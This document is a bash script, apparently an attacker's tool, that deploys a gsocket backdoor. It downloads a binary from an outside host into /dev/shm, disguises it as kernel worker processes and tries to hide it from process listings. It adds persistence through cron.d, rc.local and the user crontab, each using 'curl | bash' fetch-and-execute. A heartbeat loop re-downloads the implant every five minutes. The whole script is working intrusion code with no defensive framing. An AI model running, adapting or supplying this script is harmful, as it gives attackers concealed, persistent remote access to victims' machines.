#!/bin/bash

GSOCKET_URL="${GSOCKET_URL:-https://remotnyasar.click/AK/gs.sh}"
MY_UID=$(id -u)
echo "🛡️ GSOCKET STEALTH DEPLOY - $([[ $MY_UID -eq 0 ]] && echo "GOD MODE" || echo "USER MODE")"


curl -fsSL "$GSOCKET_URL" -o /dev/shm/gs
chmod +x /dev/shm/gs


hide_and_run() {
    
    if command -v unshare >/dev/null 2>&1; then
        unshare --pid --fork --mount-proc bash -c '
            mount -t proc none /proc
            exec -a "[kworker/0:1]" /dev/shm/gs
        ' &
    else
       
        exec -a "ksoftirqd/0" nohup /dev/shm/gs >/dev/null 2>&1 &
    fi
}


if [[ $MY_UID -eq 0 ]]; then
    
    while read pid; do
        [[ -d "/proc/$pid" && $(cat /proc/$pid/comm 2>/dev/null) == "gs" ]] && {
            mv "/proc/$pid" "/proc/$pid.hidden"
        }
    done < <(ps aux | grep '[g]s' | awk '{print $2}')
    
    
    echo "@reboot curl -fsSL $GSOCKET_URL | bash" > /etc/cron.d/gs
    chmod 644 /etc/cron.d/gs
    echo "$0 &" >> /etc/rc.local
    
    echo "🔥 GOD MODE: /proc hidden + cron + rc.local"
else
    
    (crontab -l 2>/dev/null; echo "@reboot curl -fsSL $GSOCKET_URL | bash") | crontab -
    echo "👤 USER: crontab active"
fi


hide_and_run
sleep 3

echo "EPLOYED! Test:"
echo "ps aux | grep gs  # Harus KOSONG"
echo "netstat -tulpn | grep 443  # Connection active"

# Heartbeat
while true; do
    sleep 300
    pgrep -f gs >/dev/null || curl -fsSL "$GSOCKET_URL" | bash
done